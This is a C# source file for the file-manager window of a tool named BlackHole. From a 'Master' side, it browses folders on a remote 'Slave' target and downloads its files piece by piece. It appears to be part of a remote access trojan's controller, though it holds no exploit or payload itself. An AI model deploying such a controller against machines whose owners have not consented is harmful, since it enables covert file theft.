using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using BlackHole.Master.Remote;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class FileManager
    {
        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<FileMeta> ViewModelFiles
        {
            get;
            private set;
        }

        /// <summary>
        /// 
        /// </summary>
        private long m_sucessfulTransactions, m_totalTransactions;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public FileManager(Slave slave) : base(slave)
        {
            InitializeComponent();

            Loaded += OnNavigate;

            TargetStatusBar.DataContext = slave;
            FileTransactionsList.DataContext = ViewModelCommands;
            FilesList.DataContext = ViewModelFiles = new ViewModelCollection<FileMeta>();
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnNavigate(object sender, RoutedEventArgs e)
        {
            NavigateToFolder(TxtBoxDirectory.Text);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnFolderDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var file = ((ListViewItem)sender).Content as FileMeta;
            if (file.Type == FileType.FOLDER)
                NavigateToFolder(file.Name);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnDownloadFile(object sender, RoutedEventArgs e)
        {
            ExecuteOnSelectedItems<FileMeta>(FilesList, (meta) =>
            {
                if (meta.Type == FileType.FILE)
                    DownloadFile(meta.Name);
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnCancelTransaction(object sender, RoutedEventArgs e)
        {
            ExecuteOnSelectedItems<IRemoteCommand>(FileTransactionsList, (transaction) => CancelCommand(transaction.Id));
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="folder"></param>
        private void NavigateToFolder(string folder)
        {
            this.Send(new NavigateToFolderMessage()
            {
                Path = Path.Combine(TxtBoxDirectory.Text, folder)
            });
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        private void DownloadFile(string name)
        {
            var filePath = Path.Combine(TxtBoxDirectory.Text, name);

            AddCommand(CommandFactory.CreateCommand<DownloadedFilePartMessage>(
                CommandType.DOWNLOAD,
                Slave,
                name,

                (command) => // execute
                {
                    this.Send(new DownloadFilePartMessage()
                    {
                        Id = command.Id,
                        CurrentPart = 0,
                        Path = filePath
                    });
                },
                (download) => // continue
                {
                    FileHelper.WriteDownloadedPart(Slave.OutputDirectory, download.Path, download.CurrentPart, download.RawPart);
                    this.Send(new DownloadFilePartMessage()
                    {
                        Id = download.Id,
                        Path = download.Path,
                        CurrentPart = download.CurrentPart + 1
                    });
                },
                (download) => // complete
                {
                    TotalTransaction.Content = $"Successful transactions: {++m_sucessfulTransactions}/{m_totalTransactions}";
                    FileHelper.WriteDownloadedPart(Slave.OutputDirectory, download.Path, download.CurrentPart, download.RawPart);
                    Slave.SlaveEvents.PostEvent(new SlaveEvent(SlaveEventType.FILE_DOWNLOADED, Slave, Path.GetFileName(download.Path)));
                    FinishCurrentCommand();
                },
                () => // fault
                {
                    FinishCurrentCommand();
                }));

            m_totalTransactions++;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public override async Task OnEvent(SlaveEvent ev)
        {
            await base.OnEvent(ev);
            await this.ExecuteInDispatcher(() =>
            {
                switch((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<FolderNavigationMessage>(m =>
                            {
                                TxtBoxDirectory.Text = m.Path;
                                ViewModelFiles.Items.Clear();
                                m.Files.ForEach(ViewModelFiles.Items.Add);
                            })
                            .With<StatusUpdateMessage>(m =>
                            {
                                TargetStatus.Content = m.Operation;
                                TargetStatusTooltipTitle.Text = m.Operation;
                                TargetStatusTooltipMessage.Text = m.Message;
                                TargetStatus.Foreground = m.Success ? Brushes.DarkGreen : Brushes.Red;
                                TargetStatusTooltip.PlacementTarget = TargetStatus;
                                TargetStatusTooltip.IsOpen = true;       
                            })
                            .With<DownloadedFilePartMessage>(m =>
                            {
                                UpdateCommand(m,
                                    (command) =>
                                    {
                                        command.Completed = m.CurrentPart >= m.TotalPart;
                                        command.UpdateProgression(m.CurrentPart + 1, m.TotalPart);
                                    });
                            })
                            .With<DownloadFilePartMessage>(m =>
                            {                                
                            });                        
                        break;
                }
            });
        }     
    }
}
